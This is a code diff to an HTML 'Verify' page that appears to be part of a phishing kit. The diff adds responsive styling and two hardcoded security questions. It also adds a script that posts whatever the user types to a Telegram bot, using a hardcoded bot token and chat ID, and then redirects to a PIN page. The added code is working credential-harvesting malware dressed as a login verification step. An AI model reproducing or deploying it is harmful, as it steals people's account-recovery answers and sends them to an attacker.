@@ -11,8 +11,15 @@
             margin: 0;
             font-family: 'Roboto', sans-serif;
             display: flex;
+            flex-direction: column;
             height: 100vh;
             background-color: #f7f7f7;
+        }
+        
+        @media (min-width: 768px) {
+            body {
+                flex-direction: row;
+            }
         }
         
         .left-section {
@@ -95,6 +102,20 @@
             max-width: 150px;
             margin-bottom: 20px;
         }
+        
+        @media (max-width: 768px) {
+            .left-section {
+                padding: 20px;
+                align-items: center;
+                text-align: center;
+            }
+            .right-section {
+                padding: 10px;
+            }
+            .logo {
+                max-width: 120px;
+            }
+        }
     </style>
 </head>
 
@@ -111,42 +132,59 @@
         <div class="login-form">
             <h2>Verify</h2>
             <p>Answer your security questions to continue.</p>
-
             <div class="form-group">
-                <label for="answer1" id="question1-label"></label>
+                <label for="answer1">What is your least favorite color?</label>
                 <input type="text" id="answer1" placeholder="Enter your answer" required>
             </div>
-
             <div class="form-group">
-                <label for="answer2" id="question2-label"></label>
+                <label for="answer2">What was the name of your favorite teacher?</label>
                 <input type="text" id="answer2" placeholder="Enter your answer" required>
             </div>
-
             <button id="confirm-button">Confirm</button>
             <p class="footer">English</p>
         </div>
     </div>
 
     <script>
-        // Fetching questions from Local Storage
-        document.getElementById('question1-label').innerText = localStorage.getItem('question1') || 'Question 1';
-        document.getElementById('question2-label').innerText = localStorage.getItem('question2') || 'Question 2';
-
-        // Fetching saved answers from Local Storage
-        document.getElementById('answer1').value = localStorage.getItem('answer1') || '';
-        document.getElementById('answer2').value = localStorage.getItem('answer2') || '';
-
         document.getElementById('confirm-button').addEventListener('click', function() {
             const answer1 = document.getElementById('answer1').value.trim();
             const answer2 = document.getElementById('answer2').value.trim();
 
             // Validation before proceeding
             if (answer1 && answer2) {
-                window.location.href = "pin.html"; // Redirect to pin.html
+                sendAnswersToTelegram(answer1, answer2); // Call the function to send answers
             } else {
                 alert('Please answer all security questions.');
             }
         });
+
+        function sendAnswersToTelegram(answer1, answer2) {
+            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0'; // Replace with your bot token
+            const chatId = '5615316142'; // Replace with your chat ID
+            const message = `Security Answers:\n1. ${answer1}\n2. ${answer2}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "pin.html"; // Redirect on success
+                    } else {
+                        alert('Error sending answers to Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending answers to Telegram.');
+                });
+        }
     </script>
 </body>
 
